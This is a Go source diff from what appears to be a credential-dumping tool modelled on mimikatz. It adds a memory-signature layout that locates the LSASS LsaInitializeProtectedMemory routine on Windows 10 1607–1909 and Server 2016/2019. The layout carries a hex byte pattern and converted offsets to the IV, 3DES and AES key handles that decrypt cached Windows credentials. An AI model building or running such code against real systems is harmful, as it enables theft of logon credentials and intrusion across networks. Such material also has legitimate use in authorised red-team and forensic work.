@@ -76,7 +76,7 @@ type lsaCryptoLayout struct {
 }
 
 // LsaCryptoWin10W8 is the LsaInitializeProtectedMemory layout used on
-// Win 10 21H2 — Win 11 23H2 (the same range covered by LayoutWin10W8). The
+// Win 10 21H2 — Win 11 23H2 (the same range covered by LayoutWin10New). The
 // negative offsets for h3DesKey / hAesKey were taken from mimikatz's
 // kuhl_m_sekurlsa offset table for KULL_M_WIN_BUILD_10_1809+ and converted
 // from the post-instruction RIP-base convention (mimikatz: {16, -57, -68})
@@ -101,9 +101,31 @@ var LsaCryptoWin10W8 = lsaCryptoLayout{
 	IVSize:           16,
 }
 
-// lsaCryptoLayouts lists all crypto layouts in preference order (newest first).
-// findLsaCryptoGlobalsMulti tries each until one matches and resolves.
+// LsaCryptoWin10_1607 is the LsaInitializeProtectedMemory layout for
+// Win10 1607–1909 / Server 2016 / Server 2019 (builds 14393–18363).
+// Pattern matches the canonical mimikatz PTRN_WIN6x_LsaInitializeProtectedMemory.
+// The function body includes a `lea rax,[rbp-20h]` between the `and` and `mov r9d`
+// that is not present in Win10 21H2+ builds.
+//
+// Offsets converted from mimikatz's post-disp32 convention to mov-start convention:
+//   IV:       post=+16 → movStart = 16 - 3 = 13
+//   h3DesKey: post=-57 → movStart = -57 - 3 = -60
+//   hAesKey:  post=-68 → movStart = -68 - 3 = -71
+var LsaCryptoWin10_1607 = lsaCryptoLayout{
+	Name:             "Win10_1607_Server2019",
+	Sign:             "83 64 24 30 00 48 8D 45 E0 44 8B 4D D8 48 8D 15",
+	IVMovStart:       13,
+	H3DesKeyMovStart: -60,
+	HAesKeyMovStart:  -71,
+	MovInstrLen:      7,
+	MovDispOffset:    3,
+	IVSize:           16,
+}
+
+// lsaCryptoLayouts lists all crypto layouts in preference order.
+// captureLsaCrypto tries each until one matches and resolves.
 var lsaCryptoLayouts = []lsaCryptoLayout{
+	LsaCryptoWin10_1607,
 	LsaCryptoWin10W8,
 }
 
